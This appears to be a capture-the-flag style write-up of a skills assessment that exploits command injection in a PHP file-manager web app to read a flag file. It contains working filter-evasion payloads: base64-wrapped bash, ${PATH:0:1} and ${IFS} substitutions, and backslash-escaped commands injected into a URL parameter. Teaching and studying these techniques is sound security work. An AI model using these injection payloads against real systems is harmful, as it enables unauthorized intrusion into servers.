# SKILLS ASSESSMENT

**Scoped Target**:

94.237.xx.xxx:xxxx

**Recon Analysis**:

We first want to just use the application as people normally would to get an understanding of the functionality of the application.

It looks like the file manager web app is connecting to the OS level where we can see files that are hosted on the server.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*DHXr_KJLQETpFGV1tY30fw.png" alt="" height="431" width="700"><figcaption></figcaption></figure>

I am looking at the behavior of the web app when clicking the tmp folder. I have noticed that the parameter will reflect within the URL as to=tmp.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*sP63QruxRhfbTcO9YVNyXA.png" alt="" height="624" width="700"><figcaption></figcaption></figure>

This also happened the visiting a .txt file. The parameter will reflect within the URL as to=\&view=the .txt file.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*J-RQt28WxAwk5Wa5-wT5CQ.png" alt="" height="599" width="700"><figcaption></figcaption></figure>

There are several functional action buttons per file and folder. The following action button is copy to.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*gjQ3JZfX-MGnxSe0qEu3pg.png" alt="" height="444" width="700"><figcaption></figcaption></figure>

It looks like this action allows user to copy the file to other directories.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*r5KkM70_NqJH2h7LhVrpQA.png" alt="" height="403" width="700"><figcaption></figcaption></figure>

[http://94.237.49.166:46423/index.php?to=tmp\&from=51459716.txt\&finish=1\&move=1](http://94.237.49.166:46423/index.php?to=tmp\&from=51459716.txt\&finish=1\&move=1)

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*rD7m-OmRqTgTcoTCIt09pw.png" alt="" height="325" width="700"><figcaption></figcaption></figure>

Note that once the file is moved from one directory, it can’t be re-performed in the same action as the file has been moved.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*qVTBRRDDLA6BJDUSu86tSw.png" alt="" height="343" width="700"><figcaption></figcaption></figure>

You can also see advanced search next to the normal search bar.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*68X6VX6zfQBHoae9zy5QmA.png" alt="" height="419" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*ZffheKduXtvwx1x9oT7tWQ.png" alt="" height="514" width="700"><figcaption></figcaption></figure>

**Attack vector:**

Now we have tested all functional areas, we want to target a few function areas and URL parameters to see if we can perform command injection like the moving file function area.

Below is the initial move of a file to a directory on the UI and the HTTP request.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*_9sjeuekvcmy2ap3PO5x6g.png" alt="" height="271" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*ncY80ky1RSacQ08pZvG0Ig.png" alt="" height="239" width="700"><figcaption></figcaption></figure>

Below is the repeated action on the moving of the same file to the same directory on the UI and the HTTP request.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*tLiphvDYbtwb8ctXiJ4mcg.png" alt="" height="309" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Do-CEGUOvPj5x7fATCfogw.png" alt="" height="436" width="700"><figcaption></figcaption></figure>

We want to detect the command injection in the parameter within the URL.

Command Injection Methods:

To inject an additional command into the intended one, we may use any of the following operators:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*6RqtiecXLibfJG7bNnbggQ.png" alt="" height="341" width="700"><figcaption></figcaption></figure>

As I am trying to see if the “to” parameter is by injecting command injection and see whoami and ls. The error message updated to “malicious request denied”.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*AugDlPIamC-dViU1mxSZog.png" alt="" height="361" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*6lfoA-aykZLJy4O0FylvfA.png" alt="" height="375" width="700"><figcaption></figcaption></figure>

This shows that basic commands are filtered. In this case, we will need to identify possible filters. Which can include space, blacklisted characters, blacklisted commands, command obfuscation, and WAF filters.

I am going to utilize advanced command obfuscation with base64 encoding.

```
bash<<<$(base64 -d<<<"base64 encoded OS payload")
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*8qqHQ7Flk2Q_ta4Veh5TkA.png" alt="" height="219" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*VQa99McP4WKBTheG81c-Bg.png" alt="" height="409" width="700"><figcaption></figcaption></figure>

We can see www-data as a result of whoami, I am going to test it further with ls -la to see if I can see all the files.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*1BxwIbTNtGgV_cLjJey8_w.png" alt="" height="243" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*y3D8SI-AzdRv-zy4NIqITA.png" alt="" height="353" width="700"><figcaption></figcaption></figure>

Now we have identified the attack vector by identifying the filter, we can now perform an exploit.

**Exploit**:

I want to see what’s in the root directory.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*71hBS1YyYI7UU1xOZqD4OQ.png" alt="" height="169" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*W8IH38unw5sH16ApJBbReA.png" alt="" height="354" width="700"><figcaption></figcaption></figure>

It looks like there are config.php, files folder, and index.php.

Let’s keep digging the folder.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*3ql0uD7UGvLZBFIr7WywkA.png" alt="" height="232" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*-EU1o-wPNioFbl73qZCJ-w.png" alt="" height="207" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*cgdw9PtRxdIlbW2j1KB2lw.png" alt="" height="214" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Aw5O_yCbymXRVsHSJ7tj4g.png" alt="" height="270" width="700"><figcaption></figcaption></figure>

I can’t seem to find the targeted file called flag.txt.

I am just going to move the /flag.txt file to the tmp directory and check the contents.

${PATH:0:1} = /

${IFS} = space

mv/flag.txt /var/www/html/files/tmp

mv ${PATH:0:1}flag.txt ${PATH:0:1}var${PATH:0:1}www${PATH:0:1}html${PATH:0:1}files${PATH:0:1}tmp

Based64 encoded:

bXYgJHtQQVRIOjA6MX1mbGFnLnR4dCAke1BBVEg6MDoxfXZhciR7UEFUSDowOjF9d3d3JHtQQVRIOjA6MX1odG1sJHtQQVRIOjA6MX1maWxlcyR7UEFUSDowOjF9dG1w

%0abash<<<$(base64%09-d<<\<bXYgJHtQQVRIOjA6MX1mbGFnLnR4dCAke1BBVEg6MDoxfXZhciR7UEFUSDowOjF9d3d3JHtQQVRIOjA6MX1odG1sJHtQQVRIOjA6MX1maWxlcyR7UEFUSDowOjF9dG1w)

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*3xa5s3hlJbbor7gk6IkI1A.png" alt="" height="199" width="700"><figcaption></figcaption></figure>

It looks like flag.txt file can be moved to the tmp folder, but I don't have permission to perform the action. At least the payload is half working. And we know the .flag.txt file is at the root, even though we can’t see it. We want to just go back to the root and simply cat the flag file.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*-FW3sm8WinPXRg9anbgOEA.png" alt="" height="255" width="700"><figcaption></figcaption></figure>

To do this we need a combination of base64 encoding, blacklisted characters, and backslash for bypassing single-character filters.

%26c\a\t%09${PATH:0:1}flag.txt

\&cat (horizontal tab) /flag.txt

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Uhd2OU1u7YJIZ6tpFZBHrA.png" alt="" height="416" width="700"><figcaption></figcaption></figure>
